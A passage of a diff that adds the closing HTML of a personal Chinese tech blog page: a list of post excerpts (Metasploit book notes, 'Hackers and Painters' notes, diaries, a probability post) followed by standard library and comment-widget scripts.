+
+<p>一边看书过程中，一边 google 明确名词并扩展知识面。</p>
+
+<p>本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。</p>
+
+<p>嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/">
+                <h3 class="media-heading">读书笔记《黑客与画家》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>黑客伦理</p>
+
+<p>言论自由与质疑</p>
+
+<p>做伟大的事</p>
+
+<p>黑客与画家</p>
+
+<p>如何做自己喜欢的事</p>
+
+<p>思考“禁区”</p>
+
+<p>为什么该创业</p>
+
+<p>该如何创业</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/10/20191001_20191017%E5%8D%8A%E6%9C%88%E8%AE%B0/">
+                <h3 class="media-heading">20191001_20191017半月记</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p><em>我的航海计划</em></p>
+
+<p><em>一个有趣的妹纸</em></p>
+
+<p><em>目标与技能支点</em></p>
+
+<p><em>Python算法课程笔记[未完成]</em></p>
+
+<p><em>自学网站记录</em></p>
+
+<p><em>香港事件</em></p>
+
+<p><em>读书</em></p>
+
+<p><em>看片</em></p>
+
+<p><em>音乐</em></p>
+
+<p><em>一句话牢骚</em></p>
+
+<p><em>名句思辨</em></p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/09/%E6%97%A5%E8%AE%B02019-09-24/">
+                <h3 class="media-heading">日记2019-09-24</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>距离上次日记大约三周时间。</p>
+
+<p>最近工作没有那么忙碌，所以多少折腾了一些时间做自己的事情，于是这三周还做了不少事情。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/09/%E4%B8%8D%E8%A6%81%E7%9B%B8%E4%BF%A1%E4%BD%A0%E7%9A%84%E7%9B%B4%E8%A7%89/">
+                <h3 class="media-heading">不要相信你的直觉</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>最近在复习概率论，看到了一些有趣的问题，于是顺道上网整理了一些相关问题，归纳如下。</p>
+
+<p>我看完的结论就是：不要相信你的直觉，人的本能感觉通常是和概率统计相悖的。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/09/%E6%97%A5%E8%AE%B02019-09-03/">
+                <h3 class="media-heading">日记2019-09-03</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>嘛。最近比较忙，小任务挺杂的，连绵不绝。貌似之前也有过这样的时间段，总之事情很杂，开发语言也是N种轮换的切着用，不算太开心。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         262 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://duzhi5368.github.io/images/cover.png');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js" integrity="sha256-IFHWFEbU2/+wNycDECKgjIRSirRNIDp2acEB5fvdVRU=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js" integrity="sha256-+mpyNVJsNt4rVXCw0F+pAOiB3YxmHgrbJsx4ecPuUaI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js" integrity="sha256-vMxgR/7FtLovVA+IPrR7+xTgIgARH7y9VZQnmmi0HDI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js" integrity="sha256-N0qFUh7/9vLvia87dDndewmsgsyYoNkdA212tPc+2NI=" crossorigin="anonymous"></script>
+
+
+<script src="https://duzhi5368.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/duzhi5368.github.io\/2019\/11\/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95\/';
+          
+            this.page.identifier = '\/2019\/11\/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'duzhi5368-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
